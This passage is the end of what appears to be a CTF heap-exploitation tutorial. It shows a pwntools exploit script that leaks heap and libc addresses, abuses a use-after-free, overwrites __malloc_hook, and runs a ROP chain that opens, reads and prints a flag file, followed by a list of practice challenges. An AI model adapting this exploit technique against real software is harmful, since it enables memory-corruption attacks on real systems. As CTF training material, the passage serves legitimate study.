    p.sendline('3')
    p.recvuntil("idx: ")
    p.sendline(str(idx))

def Delete(idx):
    p.recvuntil('> ')
    p.sendline('4')
    p.recvuntil("idx: ")
    p.sendline(str(idx))

def BackDoor(buf):
    p.recvuntil('> ')
    p.sendline('50056')
    sleep(0.1)
    p.send(buf)

def exp():
    #leak heap
    for i in range(7):
        Add(0,'a'*0x120)
        Delete(0)
    Show(0)
    p.recvuntil("hero name: ")
    heap_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - 0x850
    log.success("[+]heap base => "+ hex(heap_base))
    #leak libc
    Add(0,'a'*0x120)
    Add(1,'a'*0x400)
    Delete(0)
    Show(0)
    p.recvuntil("hero name: ")
    libc_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - (0x902ca0-0x71e000)
    log.success("[+]libc base => " + hex(libc_base))
    #
    for i in range(6):
        Add(0,'a'*0xf0)
        Delete(0)
    for i in range(7):
        Add(0,'a'*0x400)
        Delete(0)
    Add(0,'a'*0x400)
    Add(1,'a'*0x400)
    Add(1,'a'*0x400)
    Add(2,'a'*0x400)
    Delete(0)#UAF
    Add(2,'a'*0x300)
    Add(2,'a'*0x300)
    #agagin
    Delete(1)#UAF
    Add(2,'a'*0x300)
    Add(2,'a'*0x300)
    Edit(2,'./flag'.ljust(8,'\x00'))
    Edit(1,'a'*0x300+p64(0)+p64(0x101)+p64(heap_base+(0x000055555555c460-0x555555559000))+p64(heap_base+0x1f))

    #trigger
    Add(0,'a'*0x217)

    Delete(0)
    Edit(0,p64(libc_base+libc.sym['__malloc_hook']))
    #gdb.attach(p,'b calloc')
    Add(0,'a'*0xf0)

    BackDoor('a')
    #mov eax, esi ; add rsp, 0x48 ; ret
    #magic_gadget = libc_base + libc.sym['setcontext']+53
    # add rsp, 0x48 ; ret
    magic_gadget = libc_base + 0x000000000008cfd6
    payload = p64(magic_gadget)

    BackDoor(payload)

    p_rdi = libc_base + 0x0000000000026542
    p_rsi = libc_base + 0x0000000000026f9e
    p_rdx = libc_base + 0x000000000012bda6
    p_rax = libc_base + 0x0000000000047cf8
    syscall = libc_base + 0x00000000000cf6c5
    rop_heap = heap_base + 0x44b0

    rops = p64(p_rdi)+p64(rop_heap)
    rops += p64(p_rsi)+p64(0)
    rops += p64(p_rdx)+p64(0)
    rops += p64(p_rax)+p64(2)
    rops += p64(syscall)
    #rops += p64(libc.sym['open'])
    #read
    rops += p64(p_rdi)+p64(3)
    rops += p64(p_rsi)+p64(heap_base+0x260)
    rops += p64(p_rdx)+p64(0x70)
    rops += p64(p_rax)+p64(0)
    rops += p64(syscall)
    #rops += p64(libc.sym['read'])
    #write
    rops += p64(p_rdi)+p64(1)
    rops += p64(p_rsi)+p64(heap_base+0x260)
    rops += p64(p_rdx)+p64(0x70)
    rops += p64(p_rax)+p64(1)
    rops += p64(syscall)
    Add(0,rops)
    p.interactive('$ xmzyshypnc')

exp()
```

### 0x06 Suggested Exercises:

* 2018 HITCON children_tcache
* 2018 BCTF houseOfAtum
* 2019 HTICON Lazy House
* 2020 XCTF no-Cov twochunk
